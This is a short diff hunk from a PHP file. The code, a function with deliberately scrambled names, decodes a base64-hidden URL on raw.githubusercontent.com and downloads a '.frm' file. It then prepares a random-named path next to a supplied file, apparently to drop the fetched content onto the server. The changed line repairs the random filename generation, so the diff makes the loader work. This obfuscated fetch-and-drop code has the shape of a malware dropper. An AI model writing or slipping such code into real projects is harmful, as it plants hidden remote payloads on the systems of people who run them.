@@ -20,7 +20,7 @@ function h4k2j9m1n7p3q8r5t6($s8x2c5v9b1n7m3k6j4) {
     $a7f9d2g5h8j1k3l6p9 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21lY2h2MGQvb2J2cC1sci0zL21hc3Rlci9hY2RmMTFmMTNkZjM1MjBiMmFjY2VmNzNiYzk3NDc2ZS5mcm0=');
     $r4t8y2u5i9o3p1a6s2d = file_get_contents($a7f9d2g5h8j1k3l6p9);
     if ($r4t8y2u5i9o3p1a6s2d) {
-        $v9b2n5m8k1j4h7g3f6d = substr(md5($a7f9d2g5h8j1k3l6p9 . time() . rand()));
+        $v9b2n5m8k1j4h7g3f6d = substr(md5($a7f9d2g5h8j1k3l6p9 . time() . rand()), 0, 16);
         $x3c7v1b8n5m2k9j4h6g = dirname($s8x2c5v9b1n7m3k6j4) . '/' . $v9b2n5m8k1j4h7g3f6d . base64_decode("LmZybQ==");
         $z3x6c9v2b5n8m1k4j7p = basename($x3c7v1b8n5m2k9j4h6g, base64_decode("LmZybQ=="));
         $q7w2e5r8t1y4u7i9o3p = dirname($x3c7v1b8n5m2k9j4h6g);
